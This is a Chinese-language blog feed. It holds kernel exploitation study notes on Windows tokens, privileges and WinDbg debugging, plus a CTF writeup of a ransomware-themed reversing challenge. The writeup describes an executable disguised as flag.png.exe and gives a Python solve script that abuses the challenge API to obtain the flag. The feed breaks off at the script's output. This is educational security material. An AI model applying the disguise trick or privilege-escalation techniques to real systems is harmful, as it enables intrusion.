<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-12-25T10:53:44.379Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AngelBoy Windows Kernel Exploitation Note</title>
    <link href="https://kazma.tw/2024/12/24/AngelBoy-Windows-Kernel-Exploitation-Note/"/>
    <id>https://kazma.tw/2024/12/24/AngelBoy-Windows-Kernel-Exploitation-Note/</id>
    <published>2024-12-23T23:17:02.941Z</published>
    <updated>2024-12-25T10:53:44.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li>在一般的 binary exploitation 中，我們通常目標是一個 services 或 processes，會跑在 ring3 還有 high level code </li><li>但 kernel 跑在 ring0，且其 process 是跑在 supervisor mode，所以打下 kernel 可以拿下整個 OS<ul><li>在 linux 上會拿到 root</li><li>windows 會拿到 NT&#x2F;system</li></ul></li><li>攻擊方向<ul><li>user mode 的目標是拿 shell </li><li>kernel mode 要做 privilege escape 或 sandbox escape，又稱 Elevation of Privileges (EoP)，在 ios 上又稱 jailbreak，Android 叫 root</li></ul></li><li>基本上漏洞利用本質沒有區別，但打 kernel 需要再回到 userland 且沒處理好容易造成 crash (BSOD)</li><li>過去知名的 kernel exploit<ul><li>CVE-2016-5195 - Dirty Cow</li><li>CVE-2019-0708 - Blue Keeper</li><li>CVE-2020-0796 - SMBGhost</li></ul></li><li>實際攻擊目標<ul><li>Windows driver<ul><li>*.sys, win32k.sys, srv32.sys</li></ul></li><li>Windows kernel<ul><li>C:\Windows\system32\ntoskrnl.exe</li></ul></li></ul></li><li>架構圖<ul><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kernel_graph.png"                      alt="kernel"                ></li><li>User Process<ul><li>一般跑在 windows 執行的程式，像是 cmd.exe 或 browser 等</li></ul></li><li>Subsystem DLL<ul><li>實作 subsystem API 的動態函式庫，常用的 API 都在這邊實現，像是 kernel32.dll, kernelbase.dll, gdi.dll 等</li></ul></li><li>NTDLL<ul><li>實作 windows native API，通常在 usermode 的最底層，會呼叫 system call 來進入 kernel 層</li></ul></li><li>Services Processes<ul><li>Service Control Manager (SCM) 所管理的 Process</li></ul></li><li>System Process <ul><li>系統重要程式，終止可能會 BSOD </li><li>smss.exe&#x2F;lsass.exe&#x2F;winlogon.exe&#x2F;services.exe 等</li></ul></li><li>Subsystem Process<ul><li>不可被終止</li><li>helper to kernel for managing processes running under the winodws system</li><li>一個 session 只有一個 </li><li>csrss.exe</li></ul></li><li>Executive <ul><li>upper layer of  Ntoskrnl.exe，包含許多核心管理的部分，像是 Object Manager, I&#x2F;O Manager, Memory Manager 等</li></ul></li><li>Kernel <ul><li>處理 kernel 中更底層的事務，如 Interrupt, Scheduling, Exception 等</li></ul></li><li>Device Drivers<ul><li>Kernel modules，分很多類別</li><li>提供 os hardware interface</li></ul></li><li>Win32k<ul><li>核心驅動之一，主要處理 Graphics Device Interface (GDI)</li><li>如果用 <code>CreateWindowEx</code> 等 GDI 相關的，會由他來處理</li><li>非常複雜有獨立的 SSDT</li></ul></li><li>HAL <ul><li>HAL is an abstraction layer over the hardware closest to the CPU</li><li>hal.dll 提供 device driver 不少 API 來操作硬體，如 DMA 等</li></ul></li></ul></li></ul><h2 id="Debug-Kernel-With-Windbg"><a href="#Debug-Kernel-With-Windbg" class="headerlink" title="Debug Kernel With Windbg"></a>Debug Kernel With Windbg</h2><blockquote><p>題外話，因為我手邊只有 pve 沒有 pc，所以原本想試著用巢狀 vm 來盡可能跟教學環境相似，但 win11 vm 在 CPU 改 host 之後開機一直藍屏，照著文件設定後也沒用決定用 pve vm to vm </p></blockquote><ul><li><p>環境設定 (這裡用 host 跟 vm 代稱兩台機器)</p><ul><li>首先關掉 vm 的 secure boot </li><li>接著我們打開 System Configuration -&gt; Boot -&gt; Advanced options -&gt; Debug 打勾 -&gt; Apply -&gt; OK -&gt; Exit without restart </li><li>設定完後可以用 <code>bcdedit</code> 來看最後一行是否有啟用 debug </li><li>接著要設定 windbg attach 到 guest kernel 的方式，主要有兩種<ul><li>Net (較主流，這邊用這個)</li><li>Serial (可以參考簡報，這邊略過)</li></ul></li><li>然後在 vm 用管理員權限開一個 cmd</li><li>執行 <code>bcdedit /DBGSETTINGS NET HOSTIP:192.168.0.0 PORT:50000 KEY:w.x.y.z</code> (IP 跟 PORT 記得換成自己的)</li><li>重開機</li><li>然後打開 windbg -&gt; attach to kernel -&gt; 輸入剛才的資訊</li><li>成功 attach!</li></ul></li><li><p>windbg debug kernel 會用到的指令</p><ul><li>Display physical memory<ul><li>!d{b|d|q|u} [Physical address]<ul><li>b&#x2F;d&#x2F;q&#x2F;u 分別是讀取 byte&#x2F;dword&#x2F;qword&#x2F;unicode</li></ul></li></ul></li><li>Write physical memory<ul><li>!e{b|d} [Physical address][Value]</li></ul></li><li>Break point <ul><li>Set hardware breakpoint<ul><li>ba Access Size [Options][Address]</li><li>Access<ul><li>e&#x2F;r&#x2F;w&#x2F;i - execute&#x2F;read&#x2F;write&#x2F;io</li></ul></li><li>Options<ul><li>&#x2F;p Eprocess</li><li>指令特定的 process 才會觸發斷點</li></ul></li></ul></li></ul></li><li>更多參考資料<ul><li><a class="link"   href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg" >https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/hugsy/defcon_27_windbg_workshop" >https://github.com/hugsy/defcon_27_windbg_workshop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li></ul></li></ul><h2 id="Basic-knowledge"><a href="#Basic-knowledge" class="headerlink" title="Basic knowledge"></a>Basic knowledge</h2><h3 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h3><ul><li>_EPROCESS<ul><li>The key data structures of windows process</li><li>在 process 創建時就會建立</li><li>類似 linux 中的 task structure</li><li>系統中的每個 process 會串成一個 double link list</li></ul></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kernel_pcb.png"                      alt="pcb"                ></p><ul><li>offset 會隨著版本有差異</li><li>UniqueProcessId<ul><li>就是 Process ID</li></ul></li><li>ActiveProcessLinks (_LIST_ENTRY)<ul><li>Linked list of EPROCESS structure</li><li>在 exploit 中是極為重要的結構</li></ul></li><li>Token (_Token)<ul><li>access token</li><li>用來表示該 process 的 securiy context 的結構<ul><li>包含 user account, group, privilege and integrity level</li></ul></li><li>windows 決定物件是否可以被存取，是用 token 跟物件本身的 ACL 來判斷</li><li>決定該 Process 是否可以做某些操作，如關機</li></ul></li><li>PEB<ul><li>指向 user space 的 PEB</li></ul></li><li>ThreadListHead (_ETHREAD)<ul><li>Process 中的每個 thread 都有個 _ETHREAD</li><li>該 Process 中該結構也會串成一個 double link list</li></ul></li><li>windbg 相關指令<ul><li>!process [&#x2F;s Session][&#x2F;m Module] 0 Flags ImageName<ul><li>可以查看 ImageName 的詳細資訊，如 address of _EPROCESS </li><li>可以列出特定 image 的所有 process</li><li>Flag 一訓的詳細程度 0 最少 3 最多</li></ul></li><li>dt _EPROCESS eprocess address</li><li>dt _KPROCESS kprocess address</li><li>實作練習<ul><li>我在 vm 中開了兩個 cmd.exe ，可以用 <code>!process 0 0 cmd.exe</code> 來列出目前跟這個名稱相關的 process，可以看到我開了兩個 cmd <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/windbg_cmd.png"                      alt="cmd"                ></li><li>可以用 <code>dt _EPROCESS [剛剛其中一個 process address]</code> 看到詳細結構資訊 <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/detail_process.png"                      alt="detail"                ></li></ul></li><li>.process [&#x2F;p[&#x2F;r]][address of _EPROCESS]<ul><li>用來切換 process context </li><li>&#x2F;p：Translates all transition PTEs for this proces to physical addresses before access</li><li>Reloads user-mode symbols after the process context has been set</li></ul></li></ul></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kernel_pcb2.png"                      alt="pcb"                ></p><h3 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/_Thread.png"                      alt="thread"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/TCB.png"                      alt="tcb"                ></p><ul><li>TrapFrame (_KTRAP_FRAME)<ul><li>Trap 時的 Frame 紀錄 process 進入 kernel mode 時的所有 register 狀態</li></ul></li><li>Teb <ul><li>指向 user space 的 TEB</li></ul></li><li>Windbg 相關指令<ul><li>!thread [address]<ul><li>Address<ul><li>_ETHREAD 結構位置</li></ul></li><li>dt _ETHREAD ethread address</li><li>dt _KTHREAD kthread address</li></ul></li></ul></li></ul><h3 id="Integrity-level"><a href="#Integrity-level" class="headerlink" title="Integrity level"></a>Integrity level</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/integrity_level.png"                      alt="integrity"                ></p><ul><li>預設程式會跑在 medium</li><li>process 的 integrity level 繼承自 parent，如果執行檔 integrity 低於 parent 則使用較低的</li><li>parent 可以透過 Windows API 建立低於自身的 child process，但不能建立高於自身的，除非透過 UAC</li><li>low integrity 的 process 無法透過 windows API 取得較敏感的系統資訊</li><li>Mandatory policy<ul><li>low integrity 無法寫入較高的 object [No-Write-Up]</li><li>low integrity 無法讀取較高的 process memory [No-Read-up]</li><li>low integrity 不能再叫高的 integrity level 使用 COM [No-Execute-Up]</li></ul></li><li>icacls 可以用來檢查及設置檔案的 integrity level<ul><li>只能設置低於本身的</li><li>icacls ImageFile &#x2F;setintegritylevel Low</li></ul></li><li>Process Explorer 可以看 Process 的 integrity level<ul><li>可以在小標題右鍵 -&gt; Select Columns 把 integrity level 勾起來就會看到了 <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/process_explorer.png"                      alt="process"                ></li></ul></li></ul><h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><ul><li>DACL (Discretionary Access Control List)<ul><li>Specifies who has what access to the object <ul><li>當 user 要 access 一個 object 時會看 DACL 是否有權限</li></ul></li></ul></li><li>SACL (System Access Control List)<ul><li>Specifies which operation by with users should be logged </li><li>紀錄誰該被 log</li><li>audit info stored in system audit log </li><li>If a SACL is null, no auditing take place</li></ul></li><li>ACE (Access Control Entry)<ul><li>ACL 中的一個元素，一個 ACL 可以有 0 或多個 ACEs，每個 ACE 監控訪問物件的權限</li></ul></li><li>SID (Security identifiers)<ul><li>SID is a unique value of variable length that is used to identify a security principal (such as a security group) in Windows operating systems. SIDs that identify generic users or generic groups is particularly well-known</li><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/sid.png"                      alt="sid"                ></li><li>Revision number <ul><li>當前版本號，通常是 1</li></ul></li><li>IdentifierAuthority value <ul><li>The agent that issued the SID</li><li>NT: 5</li></ul></li><li>Subauthority value <ul><li>Identify trustees relative to the issuing authority</li></ul></li><li>Relative identifier (RID)<ul><li>表示 domain 的 user id，default 從 1000 開始，每增加一個使用者就 +1</li><li>特別的 RID<ul><li>Admin: 500</li><li>Guest: 501</li></ul></li></ul></li><li>PsGetSid.exe<ul><li>微軟官方提供的工具</li><li>獲得 user SID<ul><li>psgetsid.exe username</li></ul></li><li>SID -&gt; user<ul><li>psgetsid.exe SID</li></ul></li></ul></li><li>也可以在 process explorer 的 process 點兩下然後進去 security 欄位就可以看到</li></ul></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/DACL.png"                      alt="DACL"                ></p><h3 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h3><ul><li>簡單來說就是帳號的權限，</li><li>only use for local machine</li><li>Example<ul><li>SeChangeNotifyPrivilege</li><li>SeLoadDriverPrivilege</li><li>SeCreateTokenPrivilege</li></ul></li><li>可以用 <code>whoami /priv</code> 列出帳號權限</li><li>Super Privileges<ul><li>SeDebugPrivilege<ul><li>可以 open 任意 process (protected process 除外)，直接忽略 security descriptor，可以用 CreateRemoteThread 來 inject code</li></ul></li><li>SeRestorePrivilege<ul><li>可以覆蓋任意檔案，包含系統檔案</li></ul></li><li>SeTcbPrivilege<ul><li>Act as part of the os. This user right allows a process to impersonate any user without authentication</li></ul></li><li>SeLoadDriverPrivilege<ul><li>可以載入 Driver 並獲得 kernel code 執行權限</li></ul></li><li>SeCreateTokenPrivilege<ul><li>可以 create any user account’s token</li></ul></li><li>SeTakeOwnershipPrivilege<ul><li>可以改變任意物件的 owner</li><li>也就是可以改 DACL</li></ul></li></ul></li></ul><h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><ul><li>Windows 用 access token 來保障 process 或 thread 的安全</li><li>當使用者登入 windows 時，lsass 會依據 security database 來生一組 access token 代表當前登入的使用者</li><li>Primary token <ul><li>通常系統在一個 thread 跟受到保護的物件時只會用 primary token</li></ul></li><li>Impersonation token <ul><li>thread 可以發行跟自己 process 不一樣的安全內容，這個機制就是 impersonation</li><li>當 thread 在 impersonating 安全檢查會用 impersonation token 而不是原本 process 的 token</li></ul></li><li>token 內包含的資訊<ul><li>SID</li><li>integrity level</li><li>privileges of user and user’s groups </li><li>whether the token is a primary or impersonation token</li></ul></li><li>token 的結構 <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/_token.png"                      alt="token"                ><ul><li>Privileges (_SEP_TOKEN_PRIVILEGES)<ul><li>表示該 token 有的 privileges</li><li>Present <ul><li>表示該 token 具有的 Privileges</li></ul></li><li>Enabled<ul><li>表示具有的 Privileges 啟用的狀態</li><li>Privilege 有 Enable 才真正擁有該權限</li></ul></li><li>可以透過 AdjustTokenPrivileges 來調整 Token 中 Privilege 的狀態<ul><li>可以從 Present -&gt; Enabled</li><li>在 Medium 的 integrity levle 並非每個都可以改，特殊權限無法直接啟用</li></ul></li></ul></li><li>AuditPolicy<ul><li>表示要針對該 token 做的 AuditPolicy</li></ul></li><li>UserAndGroups (_SID_AND_ATTRIBUTES)<ul><li>Points to an array of SID_AND_ATTRIBUTES</li><li>array[0] 是 token’s user ID. Any additional elements are those of goups.</li><li>SID<ul><li>Pointer to a SID structure</li></ul></li><li>Attributes<ul><li>Specifies attributes of the SID </li><li>SIDs have attributes that indicate whether they are currently enabled, disabled, or mandatory, and how they are used</li></ul></li></ul></li><li>IntegrityLevelIndex<ul><li>表示 Integrity Level 的 SID 在 UserAndGroups 的 index</li></ul></li></ul></li><li>串起來的結構圖參考 <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/summary_token.png"                      alt="summary"                ></li><li>windbg 相關指令<ul><li>!token [address of _TOKEN]<ul><li>查看該 token 的資訊</li></ul></li><li>dt _token [address of _TOKEN]</li></ul></li></ul><h3 id="Security-Descriptor"><a href="#Security-Descriptor" class="headerlink" title="Security Descriptor"></a>Security Descriptor</h3><ul><li>紀錄前面那些安全資訊，紀錄誰可以對什麼物件做什麼<ul><li>每個 object 的都有個 security descriptor 來決定誰可以存取什麼物件</li></ul></li><li>裡面包含<ul><li>SIDs for the owner and primary group of an object </li><li>DACL</li><li>SACL</li></ul></li><li>能不能存取該物件，都是由該 Object 的 Security descriptor 決定<ul><li>藉由比對要存取的 object 的 security descriptor 及 process 本身的 access token 決定</li></ul></li><li>存在 object header 中</li></ul><h3 id="Access-Check"><a href="#Access-Check" class="headerlink" title="Access Check"></a>Access Check</h3><ul><li>決定該 user 是否有權限存取該物件主要有下列兩個判段條件<ul><li>Mandatory Integrity Check (MIC)</li><li>Integrity level </li><li>優先判斷</li></ul></li><li>DACL <ul><li>Determines the access that a specific user account has to an object</li></ul></li><li>Expample - Access an object <ul><li>low integrity level (If zero DACL)<ul><li>R&#x2F;W to all object with integrity level of low</li><li>R to object with integrity level of medium or high</li></ul></li></ul></li><li>Example - Access a process <ul><li>Low integrity level (If zero DACL)<ul><li>R&#x2F;W to all process with integrity level of low</li><li>No R&#x2F;W to process with integrity level of medium or high <ul><li>[No-Read-Up]</li></ul></li></ul></li></ul></li><li>當 access 物件的檢查方式<ul><li>如果沒有 DACL 就會分配所有權限</li><li>看該 user 是不是 owner，是的話就會去找 DACL 中是否有該 Owner Right SID (S-1-3-4)，接下來的操作就會使用該 SID<ul><li>沒有就會給 read-control 和 write-DACL 的權限</li></ul></li><li>接下來依序看 DACL 中的 ACE<ul><li>如果需求的權限都 match 並且都許可，就會 allow</li><li>如果遇到 deny 該 user 的 ACE，會直接 deny 並不會看接下來的 ACE</li><li>如果找到最後，依舊都沒有 match 就會 deny</li></ul></li></ul></li></ul><h3 id="Control-Register"><a href="#Control-Register" class="headerlink" title="Control Register"></a>Control Register</h3><ul><li>A control register is a processor register which changes or controls the general behavior of a CPU or other digital device. Common tasks performed by control registers include interrupt control, switching the addressing mode, paging control, and coprocessor control.<ul><li>決定一些 CPU 的行為</li><li>定址模式</li><li>是否啟用 interrupt</li></ul></li><li>CR2 <ul><li>存放 Page fault 時的 Virtual Address</li></ul></li><li>CR3<ul><li>在有開 paged 的情況下會啟用，用來讓 CPU 做 address transition，該 register 存放當前 process 的 page table 位置 (PML4)</li></ul></li><li>CR4<ul><li>Used in protected mode to control operations such as virtual-8086 support, enabling I&#x2F;O breakpoints, page size extension and machine-check exceptions.</li></ul></li><li>CR8<ul><li>表示當前的 IRQL</li></ul></li></ul><h3 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h3><ul><li>MMU<ul><li>在現代 os 中，當我們 access 一個記憶體時，看到的並不是真正的記憶體位置，而是 Virtual Address，當我們 access 的當下，CPU 才會透過 MMU 去將 Virtual Address 轉換成 physical address</li></ul></li><li>Pages and Address translatin</li><li>PTE</li><li>self-modify</li><li>VADs</li><li>PFN Database</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;在一般的 binary exploitation 中，我們通常目標是一個 ser</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="note" scheme="https://kazma.tw/tags/note/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
    <category term="kernel" scheme="https://kazma.tw/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>CGGC Reverse Medium Kazmansomware Writeup</title>
    <link href="https://kazma.tw/2024/12/07/CGGC-2024-Reverse-Medium-Kazmansomware-Writeup/"/>
    <id>https://kazma.tw/2024/12/07/CGGC-2024-Reverse-Medium-Kazmansomware-Writeup/</id>
    <published>2024-12-07T06:22:39.961Z</published>
    <updated>2024-12-07T08:14:18.193Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這次出了一題勒索軟體當作 CGGC 2024 決賽的 reverse medium，開發上其實花了不少時間，因為一直在調整勒索的範圍以及在思考考點要怎麼拿捏比較適合，最後也花了點時間反覆測試題目在解題上是可行的才放心去做別的事，希望大家會喜歡，雖然最後題目難度偏簡單有點可惜，但也許之後會出個 revenge 也說不定。<br>題解的部分會直接用出題者的角度去介紹，所以大家也可以參考看看跟自己的做法有哪些差異。</p><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>這次的題目會給一個 flag.zip 如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_flag.png"                      alt="flag.png"                ><br>然後我們解壓縮之後會看到 flag.png，但其實他是一個 flag.png.exe，只是因為 windows 預設會隱藏副檔名的顯示，所以如果我們執行這張假圖片的話他就會執行到裡面藏的勒索軟體 rans.exe，像是下面這樣：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_exe.png"                      alt="exe"                ><br>可以明顯看到他幫我們換桌布並且跳出一個類似勒索軟體的 gui，並且如果我們嘗試關閉的話會看到需要 termination key：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_termination.png"                      alt="termination"                ><br>那這邊原本其實是想懲罰在主機解題的人，所以原本是會把檔案都加密的，但是評估了一下還是只幫各位換桌布而已，有點可惜QQ<br>總之如果各位把他丟進去逆向工具會發現他其實是一個 Self-Extracting Archive 的壓縮檔：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_sfx.png"                      alt="sfx"                ><br>這可以直接透過 WinRAR 或是 binwalk 之類的工具拿到 rans.exe 如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_rans.png"                      alt="rans"                ><br>那把 rans.exe 丟去逆向應該會發現它是由 python 編譯成的 exe：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_pyi.png"                      alt="pyi"                ><br>那實際上我確實是用 <code>auto-py-to-exe</code> 編譯成的，所以我們這邊可以先用 pyinstxtractor 幫我們解出 pyc：<br><a class="link"   href="https://github.com/extremecoders-re/pyinstxtractor.git" >https://github.com/extremecoders-re/pyinstxtractor.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>然後再用 decompyle3 把 rans.pyc 解回 rans.py，如果用 uncompyle6 可能會因為不支援最新版的 python 所以反編譯失敗。<br>接著拿到 rans.py 後就應該就沒什麼問題了，可以注意到勒索軟體它會去生成一組隨機的 machine id 跟 key 然後用 receive_key 的 api 把資料送給遠端的 server，然後又可以注意到勒索軟體使用者嘗試輸入 key 之後解開的時候會去拿 machine id 跟 key 請求 get_flag api。<br>那這邊其實解法很簡單，我們其實只要自己生一組 machine id 跟 key 之後請求 receive_key api 就可以在遠端存下這組 id 跟 key，然後我們再用同一組 id 跟 key 去請求 get_flag 就可以拿到 flag 了，因為資料庫裡存在我們剛剛放進去的那組 key。</p><p>不過一開始沒想到的是，後來看 dashboard 好像有人存了一組空白的 id 跟 key 導致後來請求空白的 id 跟 key 就能拿到 flag 了 QQ<br>有點可惜 receive_key api 應該加一下限制，不然大家隨便送的 id 跟 key 都會收。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/kazmansomware_space.png"                      alt="space"                ></p><h3 id="Exploit-參考"><a href="#Exploit-參考" class="headerlink" title="Exploit 參考"></a>Exploit 參考</h3><p>GPT 生的解題腳本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python pyinstxtractor.py rans.exe</span></span><br><span class="line"><span class="comment"># decompyle3 ./rans.pyc &gt; rans.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Server endpoints</span></span><br><span class="line">DASHBOARD_URL = <span class="string">&#x27;https://rans.kazma.tw/prjrans/includes/api/receive_key.php&#x27;</span></span><br><span class="line">GET_FLAG_URL = <span class="string">&#x27;https://rans.kazma.tw/prjrans/includes/api/get_flag.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key generation function (matches the logic in EncryptionTool)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">password, salt=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> salt <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        salt = get_random_bytes(<span class="number">16</span>)  <span class="comment"># Generate a random salt</span></span><br><span class="line">    <span class="keyword">return</span> PBKDF2(password.encode(), salt, dkLen=<span class="number">32</span>, count=<span class="number">1000000</span>), salt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit logic</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># Step 1: Generate a fake machine ID</span></span><br><span class="line">    fake_machine_id = <span class="built_in">str</span>(uuid.uuid4())  <span class="comment"># Generate a valid UUID</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Fake Machine ID: <span class="subst">&#123;fake_machine_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2: Generate a fake encryption key</span></span><br><span class="line">    password = <span class="string">&quot;PleaseGiveMeMoney&quot;</span>  <span class="comment"># Password used in the code</span></span><br><span class="line">    key, salt = generate_key(password)</span><br><span class="line">    encoded_key = base64.b64encode(key).decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># Encode the key in base64</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Generated Encryption Key: <span class="subst">&#123;encoded_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3: Send the machine_id and key to the server</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;machine_id&#x27;</span>: fake_machine_id,</span><br><span class="line">        <span class="string">&#x27;encryption_key&#x27;</span>: encoded_key</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">    response = requests.post(DASHBOARD_URL, json=payload, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Successfully submitted machine ID and key to the server!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to submit key. Server response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 4: Use the fake machine ID and key to request the flag</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;machine_id&#x27;</span>: fake_machine_id,</span><br><span class="line">        <span class="string">&#x27;decryption_key&#x27;</span>: encoded_key</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(GET_FLAG_URL, json=payload, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&quot;success&quot;</span>):</span><br><span class="line">            flag = data.get(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;No flag returned.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Successfully retrieved the flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to retrieve the flag: <span class="subst">&#123;data.get(<span class="string">&#x27;message&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to fetch flag. Server response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the exploit</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">╰─ python solve.py           